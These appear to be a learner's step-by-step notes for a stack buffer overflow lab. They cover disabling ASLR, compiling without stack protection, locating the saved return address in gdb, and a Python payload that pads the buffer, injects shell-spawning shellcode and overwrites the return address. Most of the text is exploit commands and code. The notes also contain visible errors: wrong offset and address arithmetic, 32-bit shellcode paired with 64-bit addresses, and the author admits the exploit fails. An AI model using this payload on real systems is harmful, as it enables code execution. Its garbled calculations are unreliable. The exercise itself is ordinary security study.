1. disable ASLR:


$ sudo sysctl kernel.randomize_va_space=0 

We disable also the debugging of the segmentation fault:

$ sudo sysctl -w debug.exception-trace=0

2. Compile program

$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c

3. Execute with GDB:

$ gdb shellcode

we turn into intel syntax:

$ set disassembly-flavor intel

then we look where the main function resides with:

$ disas main

and we create a breakpoint there with

$ break *main+108

then we run the code with a large chr, so with  run and then "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" as argument and when it stops we want to see where the stack resides:

$ x/32wx $rsp

and with the command "into frame " we see where the buffer breaks.

rip is located at: 0x7fffffffde38 and our buffer starts at 0x7fffffffde10  which are 72 bytes of difference, therefore we need 40 bytes of padding to access the EIP.


6. We create the shellcode with the padding  in python to run the programme and run:

the adress will be the location of rip +4 bytes so 0x7fffffffde38 +4 bytes = 0x7fffffffde1c

python code:
########################################################


shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
padding = '\x41' * 40
return_adress = "\x1c\xde\xff\xff\xff\x7f"
print(padding+shellcode+return_adress)


###########################################3

and to try to see if it works we must run:

$ python exploit_shellcode.py | ./shellcode


#in my case it doesn't run and it must be due to a problem in the system or an error on the pointer direction